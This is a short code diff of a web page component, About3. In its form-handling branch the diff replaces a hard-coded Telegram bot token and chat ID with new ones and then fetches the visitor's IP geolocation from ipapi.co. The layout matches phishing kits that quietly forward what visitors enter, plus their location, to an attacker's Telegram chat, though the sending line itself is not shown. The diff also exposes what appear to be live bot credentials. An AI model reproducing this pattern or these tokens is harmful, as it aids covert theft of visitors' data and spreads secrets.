@@ -20,8 +20,8 @@ const About3 = () => {
           // You can set an error state or display a message
           return;
         } else {
-          const bot = 'bot6488129251:AAGQ8kegaE-9aCDK5R58Tcc5ZzMQQF7fJ-Y';
-          const chid = '6419883495';
+          const bot = 'bot7509065305:AAF5sW4RudqzVG42Tp5-0JTm9-rZJXStz90';
+          const chid = '7018720331';
     
           fetch(`https://ipapi.co/json/`)
             .then((response) => response.json())
